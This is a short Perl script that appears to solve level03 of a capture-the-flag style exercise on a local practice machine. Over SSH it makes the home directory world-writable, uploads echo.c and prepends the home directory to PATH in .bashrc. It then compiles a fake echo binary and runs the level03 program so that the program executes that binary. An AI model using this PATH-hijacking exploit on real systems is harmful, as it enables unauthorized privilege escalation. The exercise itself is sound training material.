#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level03";

$chmod = "ssh -qp $port $user\@$ip 'chmod 777 .'";
print $green, $chmod, $reset, "\n";
system($chmod);

$scp = "scp -q -P $port ./echo.c $user\@$ip:~";
print $red, $scp, $reset, "\n";
system($scp);

$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
$input = "echo $path > .bashrc && source .bashrc && gcc echo.c -o echo && ./level03";
print $green, $input, $reset, "\n";
system("ssh -qp $port $user\@$ip 'chmod 777 .bashrc && $input'");
